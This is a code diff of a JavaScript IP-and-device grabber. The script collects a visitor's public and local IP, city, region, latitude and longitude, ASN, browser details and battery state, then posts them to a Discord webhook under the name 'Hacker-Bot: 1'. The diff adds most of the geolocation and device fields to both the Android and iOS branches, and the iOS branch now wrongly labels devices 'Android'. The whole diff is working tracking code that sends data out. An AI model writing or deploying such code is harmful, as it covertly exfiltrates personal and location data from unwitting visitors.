@@ -176,8 +176,8 @@ const timeInfo = `${(time.getHours()<10?"0":"") + time.getHours()}:${(time.getMi
 async function getIP(){
     try {
         let response = await fetch('https://api64.ipify.org?format=json');
-        let data = await response.json();
-        IP = data.ip;
+        let dataIP = await response.json();
+        IP = dataIP.ip;
     } catch (error) {
         console.error('Error fetching IP:', error);}}
 async function getLocalIP(){
@@ -194,6 +194,18 @@ async function getC(){
         let response = await fetch('https://ipapi.co/json/');
         let data = await response.json();
         C = data.country_name + " " + data.country;
+        L = data.languages
+        CC = data.country_calling_code
+        Ci = data.city
+        Re = data.region
+        Of = data.utc_offset
+        TZ = data.timezone
+        LG = data.longitude
+        LT = data.latitude
+        CA = data.country_area
+        Asn = data.asn
+        Org = data.org
+        CP = data.country_population
     } catch (error) {
         console.error('Error fetching country:', error);
         C = "Unknown";}}
@@ -207,27 +219,46 @@ async function sendToDiscord(){
                let info = `
 [+] Device: Android
 [+] Information: 1
-[+] Public IP: ${IP}
-[+] Local IP: ${localIP}
-[+] Country: ${C}
-[+] Time: ${timeInfo}
-[+] Device Name: ${deviceName}
-[+] Device Version: ${os}
-[+] UserAgent: ${navigator.userAgent}
-[+] Platform: ${navigator.platform}
-[+] Vendor: ${navigator.vendor}
-[+] Language: ${navigator.language}
-[+] Languages: ${navigator.languages}
-[+] Cookie Enabled: ${navigator.cookieEnabled}
-[+] Device Memory: ${navigator.deviceMemory || "Unknown"}
-[+] Hardware Concurrency: ${navigator.hardwareConcurrency || "Unknown"}
-[+] Downlink: ${connection.downlink || "Unknown"}
-[+] Effective Type: ${connection.effectiveType || "Unknown"}
+[+] Public IP: ${IP||"Unknown"}
+[+] Local IP: ${localIP||"Unknown"}
+[+] Country: ${C||"Unknown"}
+[+] Country Languages: ${L||"Unknown"}
+[+] Country Code: ${CC||"Unknown"}
+[+] City: ${Ci||"Unknown"}
+[+] Region: ${Re||"Unknown"}
+[+] Utc Offset: ${Of||"Unknown"}
+[+] Timezone: ${TZ||"Unknown"}
+[+] Longitude: ${LG||"Unknown"}
+[+] Latitude: ${LT||"Unknown"}
+[+] Country_area: ${CA||"Unknown"}
+[+] Asn: ${Asn||"Unknown"}
+[+] Org: ${Org||"Unknown"}
+[+] Country Population: ${CP||"Unknown"}
+[+] Time: ${timeInfo||"Unknown"}
+[+] Device Name: ${deviceName||"Unknown"}
+[+] Device Version: ${os||"Unknown"}
+[+] App Version: ${navigator.appVersion||"Unknown"}
+[+] App Name: ${navigator.appName||"Unknown"}
+[+] Online: ${navigator.onLine||"Unknown"}
+[+] Max Touch Points: ${navigator.maxTouchPoints||"Unknown"}
+[+] Product: ${navigator.product||"Unknown"}
+[+] UserAgent: ${navigator.userAgent||"Unknown"}
+[+] Platform: ${navigator.platform||"Unknown"}
+[+] Vendor: ${navigator.vendor||"Unknown"}
+[+] Language: ${navigator.language||"Unknown"}
+[+] Languages: ${navigator.languages||"Unknown"}
+[+] Cookie Enabled: ${navigator.cookieEnabled||"Unknown"}
+[+] App Code Name: ${navigator.appCodeName||"Unknown"}
+[+] Device Memory: ${navigator.deviceMemory||"Unknown"}
+[+] Hardware Concurrency: ${navigator.hardwareConcurrency||"Unknown"}
+[+] Downlink: ${connection.downlink||"Unknown"}
+[+] Save Data: ${navigator.connection.saveData||"Unknown"}
+[+] Effective Type: ${connection.effectiveType||"Unknown"}
 [+] RTT: ${connection.rtt || "Unknown"}
-[+] Battery Charging: ${battery.charging ? "true" : "false"}
-[+] Battery Level: ${Math.round(battery.level * 100)}%
-[+] Battery Charging Time: ${battery.chargingTime || "Unknown"}
-[+] Battery Discharging Time: ${battery.dischargingTime || "Unknown"}`;
+[+] Battery Charging: ${battery.charging ? "true" : "false"||"Unknown"}
+[+] Battery Level: ${Math.round(battery.level * 100)||"Unknown"}%
+[+] Battery Charging Time: ${battery.chargingTime||"Unknown"}
+[+] Battery Discharging Time: ${battery.dischargingTime||"Unknown"}`;
 console.log(info);
 const messagePayload = {
     content: `\`\`\`\n${info}\n\`\`\``,
@@ -239,25 +270,48 @@ fetch(webhookURL, {
     body: JSON.stringify(messagePayload)})})});
     }else if (isIOS){
     let info = `
-[+] Device: IOS
+[+] Device: Android
 [+] Information: 1
-[+] Public IP: ${IP}
-[+] Local IP: ${localIP}
-[+] Country: ${C}
-[+] Time: ${timeInfo}
-[+] Device Name: ${deviceName}
-[+] Device Version: ${os}
-[+] UserAgent: ${navigator.userAgent}
-[+] Platform: ${navigator.platform}
-[+] Vendor: ${navigator.vendor}
-[+] Language: ${navigator.language}
-[+] Languages: ${navigator.languages}
-[+] Cookie Enabled: ${navigator.cookieEnabled}
-[+] Device Memory: ${navigator.deviceMemory || "Unknown"}
-[+] Hardware Concurrency: ${navigator.hardwareConcurrency || "Unknown"}
-[+] Downlink: ${connection.downlink || "Unknown"}
-[+] Effective Type: ${connection.effectiveType || "Unknown"}
-[+] RTT: ${connection.rtt || "Unknown"}`;
+[+] Public IP: ${IP||"Unknown"}
+[+] Local IP: ${localIP||"Unknown"}
+[+] Country: ${C||"Unknown"}
+[+] Country Languages: ${L||"Unknown"}
+[+] Country Code: ${CC||"Unknown"}
+[+] City: ${Ci||"Unknown"}
+[+] Region: ${Re||"Unknown"}
+[+] Utc Offset: ${Of||"Unknown"}
+[+] Timezone: ${TZ||"Unknown"}
+[+] Longitude: ${LG||"Unknown"}
+[+] Latitude: ${LT||"Unknown"}
+[+] Country_area: ${CA||"Unknown"}
+[+] Asn: ${Asn||"Unknown"}
+[+] Org: ${Org||"Unknown"}
+[+] Country Population: ${CP||"Unknown"}
+[+] Time: ${timeInfo||"Unknown"}
+[+] Device Name: ${deviceName||"Unknown"}
+[+] Device Version: ${os||"Unknown"}
+[+] App Version: ${navigator.appVersion||"Unknown"}
+[+] App Name: ${navigator.appName||"Unknown"}
+[+] Online: ${navigator.onLine||"Unknown"}
+[+] Max Touch Points: ${navigator.maxTouchPoints||"Unknown"}
+[+] Product: ${navigator.product||"Unknown"}
+[+] UserAgent: ${navigator.userAgent||"Unknown"}
+[+] Platform: ${navigator.platform||"Unknown"}
+[+] Vendor: ${navigator.vendor||"Unknown"}
+[+] Language: ${navigator.language||"Unknown"}
+[+] Languages: ${navigator.languages||"Unknown"}
+[+] Cookie Enabled: ${navigator.cookieEnabled||"Unknown"}
+[+] App Code Name: ${navigator.appCodeName||"Unknown"}
+[+] Device Memory: ${navigator.deviceMemory||"Unknown"}
+[+] Hardware Concurrency: ${navigator.hardwareConcurrency||"Unknown"}
+[+] Downlink: ${connection.downlink||"Unknown"}
+[+] Save Data: ${navigator.connection.saveData||"Unknown"}
+[+] Effective Type: ${connection.effectiveType||"Unknown"}
+[+] RTT: ${connection.rtt || "Unknown"}
+[+] Battery Charging: ${battery.charging ? "true" : "false"||"Unknown"}
+[+] Battery Level: ${Math.round(battery.level * 100)||"Unknown"}%
+[+] Battery Charging Time: ${battery.chargingTime||"Unknown"}
+[+] Battery Discharging Time: ${battery.dischargingTime||"Unknown"}`;
 const messagePayload = {
     content: `\`\`\`\n${info}\n\`\`\``,
     username: "Hacker-Bot: 1",
